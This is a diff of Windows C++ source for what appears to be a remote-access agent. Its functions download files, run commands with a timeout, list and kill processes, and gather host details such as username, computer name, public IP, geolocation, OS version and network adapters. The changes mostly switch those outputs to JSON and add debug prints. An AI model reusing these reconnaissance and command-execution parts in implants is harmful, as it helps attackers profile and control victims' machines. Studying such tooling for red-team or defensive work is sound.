@@ -106,7 +106,7 @@ BOOL doFileDownload(std::string url, std::string filepath) {
 
 
 //Executes commands and stores the output in string buffer. Timeout = MAX_TIMEOUT (prevents non-returning commands from breaking code)
-//Returns string buffer containing command output 
+//Returns JSON string buffer containing command and output in format {"command": "whoami", "output": "Administrator"}
 std::string execCmd(struct Strings* strings, std::string cmd, DWORD MAX_TIME) {
 	nlohmann::json jsonInfo;
 	jsonInfo["command"] = cmd;
@@ -197,7 +197,8 @@ std::string sendRequestGetResponse(HANDLE hRequest) {
 }
 
 
-//Gathers OS information via ProductName and DisplayVersion registry keys, returns string
+//Gathers OS information via ProductName and DisplayVersion registry keys
+//Returns JSON string in format {"DisplayVersion":"21H1","ProductName":"Windows 10 Home"}
 std::string getOSInfo(struct Strings* strings) {
 	nlohmann::json jsonInfo;
 	char value[256];
@@ -224,7 +225,8 @@ std::string getPublicIP(HANDLE hInternet) {
 }
 
 
-//Gets list of current running processes and converts to string
+//Gets list of current running processes and converts to JSON string
+// JSON in format PID, name {"1160":"Calculator.exe","11656":"chrome.exe"...}
 std::string getProcToStr() {
 	nlohmann::json jsonInfo;
 	HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -264,7 +266,8 @@ BOOLEAN killProcess(DWORD pid) {
 }
 
 
-//Gets list of network interfaces and converts MAC/IP addresses to comma-separated string
+//Gets list of network interfaces and converts MAC/IP addresses JSON in format
+//{interfacename: {"ip":ip, "mac":mac}}
 std::string getNetworkInfo() {
 	nlohmann::json jsonInfo;
 
@@ -292,41 +295,33 @@ std::string getNetworkInfo() {
 		while (pAdapter) {
 			std::string MAC;
 			for (i = 0; i < pAdapter->AddressLength; i++) {
-				if (i == (pAdapter->AddressLength - 1)) {
-					char buf[UNLEN + 1];
-					_itoa_s((int)pAdapter->Address[i], buf, 16);
-					if ((int)pAdapter->Address[i] < 0x10)
-						MAC += "0";
-					buf[UNLEN] = 0;
-					MAC += buf;
-				}
-				else {
-					char buf[UNLEN + 1];
-					_itoa_s((int)pAdapter->Address[i], buf, 16);
-					if ((int)pAdapter->Address[i] < 0x10)
-						MAC += "0";
-					buf[UNLEN] = 0;
-					MAC += buf;
+				char buf[UNLEN + 1];
+				_itoa_s((int)pAdapter->Address[i], buf, 16);
+				if ((int)pAdapter->Address[i] < 0x10)
+					MAC += "0";
+				buf[UNLEN] = 0;
+				MAC += buf;
+				if (i != (pAdapter->AddressLength - 1)) {
 					MAC += "-";
 				}
 			}
-			jsonInfo[i]["name"] = pAdapter->AdapterName;
-			jsonInfo[i]["MAC"] = MAC;
-			jsonInfo[i]["IP"] = pAdapter->IpAddressList.IpAddress.String;
+			jsonInfo[pAdapter->AdapterName]["mac"] = MAC.c_str();
+			jsonInfo[pAdapter->AdapterName]["ip"] = pAdapter->IpAddressList.IpAddress.String;
+			std::cout << pAdapter->AdapterName << " " << MAC << " " << pAdapter->IpAddressList.IpAddress.String << "\n";
 			pAdapter = pAdapter->Next;
 			i++;
 		}
 	}
 	if (pAdapterInfo)
 		FREE(pAdapterInfo);
+	std::cout << jsonInfo.dump() << "\n";
 	return jsonInfo.dump();
 }
 
 
 /*
-Gathers all info from device and converts to string. Basically just calls a bunch of the other functions and combines the output.
+Gathers all info from device and converts to JSON. Basically just calls a bunch of the other functions and combines the output.
 Currently includes: public IP, username, computer name, geolocation, memory amount, IP addresses, OS version info
-Output Format: publicIP&username&computername&iso2&memory&ip1,ip2,ip3...&osInfo
 */
 std::string gatherInfo(struct Strings* strings, HANDLE hInternet) {
 	nlohmann::json jsonInfo;
